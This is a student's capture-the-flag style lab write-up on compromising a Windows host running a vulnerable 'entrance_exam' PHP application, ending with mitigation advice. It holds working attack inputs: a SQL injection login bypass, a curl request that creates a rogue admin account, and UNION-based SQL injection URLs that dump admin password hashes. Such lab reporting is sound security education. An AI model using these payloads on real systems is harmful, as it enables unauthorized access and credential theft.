# gloin

## Target IP Address
10.0.5.31 (from dns-resolver.sh)
## Open Ports
```
└─$ sudo nmap 10.0.5.31 -sS -sV -p- -T4   
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-17 16:38 EDT
Nmap scan report for 10.0.5.31
Host is up (0.0012s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
443/tcp  open  ssl/http      Apache httpd 2.4.51 ((Win64) OpenSSL/1.1.1l PHP/7.3.31)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
22(ssh), 443(https), and 3389(rdp). target is using windows OS

## Discovered Vulnerability
<img width="793" height="599" alt="image" src="https://github.com/user-attachments/assets/d31c4953-2227-45a0-952c-ce9db879cd20" />

potentially can use a SQLi attack

## How you achieved a foothold

```
1234' or 1=1;
```
i tried the simplest SQLi attack (or 1=1 exploit) and it worked

<img width="1050" height="381" alt="image" src="https://github.com/user-attachments/assets/ae6ff32d-756c-4f90-ab11-2a6047be3f0b" />


## How you achieved root/Administrative level compromise

found this exploit that creates an admin account: https://www.exploit-db.com/exploits/50396

```
┌──(champuser㉿kali)-[~/ChamplainTechJournals/eth-hack-sec335/week09]
└─$ curl -d "id=&fullname=charlotte&username=charlotte&type=1&password=916b5dbd201b469998d9b4a4c8bc4e08" -X POST 'https://10.0.5.31/entrance_exam/Actions.php?a=save_admin' -k
{"status":"success","msg":"New User successfully saved."}   
```
found admin login screen just in the `/admin` subdirectory
<img width="1322" height="652" alt="image" src="https://github.com/user-attachments/assets/1806918e-cf8b-442c-9032-43221d018706" />
<img width="1823" height="392" alt="image" src="https://github.com/user-attachments/assets/5d9edba0-c55a-445e-a891-f3c3bf2a1e40" />

eventually ran into dead end...


but found this SQL injection exploit: https://www.exploit-db.com/exploits/50398

```
http://10.0.5.31/entrance_exam/admin/view_enrollee.php?id=1'+UNION+SELECT+1,2,3,4,5,6,password,username,9,10,11,12,13,14,15+FROM+admin_list;
```
<img width="1592" height="355" alt="image" src="https://github.com/user-attachments/assets/1b635df7-4f84-4c9c-a1e1-e9954033c3d1" />

this might be a hash, but let's check the other SQLi on the exploitDB page
```
https://10.0.5.31/entrance_exam/take_exam.php?id=%27+UNION+SELECT+1,username||%27;%27||password,3,4,5,6,7+FROM+admin_list;
```
<img width="1611" height="186" alt="image" src="https://github.com/user-attachments/assets/843969a8-9b10-4f9c-8249-46dd496662a4" />

it was a hash, let's use it on the `administrator` Windows local account
<img width="1292" height="433" alt="image" src="https://github.com/user-attachments/assets/7cf66a4c-014c-4d2f-9874-c71604dfd8ce" />

## Root Flag

i actually found the root flag before the user flag:

<img width="737" height="603" alt="image" src="https://github.com/user-attachments/assets/89a24ef4-c958-484e-ad41-1ffa845d1a7c" />

## User Flag

<img width="417" height="87" alt="image" src="https://github.com/user-attachments/assets/3242e16a-8d36-43fb-8566-7140b7a92d67" />

## How might the vulnerabilities be mitigated by the systems administrator and developer?

The web application had critical security flaws that allowed me both to create an admin account and fetch the admin password via SQL injection relatively easily. The systems administrator should update the web app to a version not vulnerable to these attacks, and the developer should parameterized SQL fields to limit SQLi attacks.

## Reflection

This lab was a bit more open ended and there was multiple ways of attacking the machine. I searched 'Online College Entrance Exam' exploit and was surprised that such a critical exploit appeared in Google so quickly, it was one of the first few results. Also I ended up creating an administrator account on the application, however that didn't prove to be useful when getting the flags, though it would be useful in other exploits.
